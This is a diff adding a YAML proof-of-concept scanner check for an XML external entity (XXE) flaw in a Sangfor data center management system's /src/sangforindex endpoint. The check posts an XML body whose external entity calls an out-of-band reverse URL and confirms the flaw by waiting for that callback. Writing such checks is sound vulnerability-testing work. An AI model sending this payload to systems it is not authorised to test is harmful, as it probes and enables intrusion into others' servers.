@@ -1,0 +1,25 @@
+name: poc-yaml-sangfor-data_center_management_system-sangforindex-xxe
+manual: true
+transport: http
+set:
+    reverse: newReverse()
+    reverseURL: reverse.url
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /src/sangforindex
+            headers:
+                Content-Type: text/xml
+            body: |-
+                <?xml version="1.0" encoding="utf-8"?>
+                <!DOCTYPE root [
+                <!ENTITY rootas SYSTEM "{{reverseURL}}">
+                ]>
+                <xxx>
+                &rootas;
+                </xxx>
+        expression: response.status == 404 && reverse.wait(5)
+expression: r0()
+detail: {}
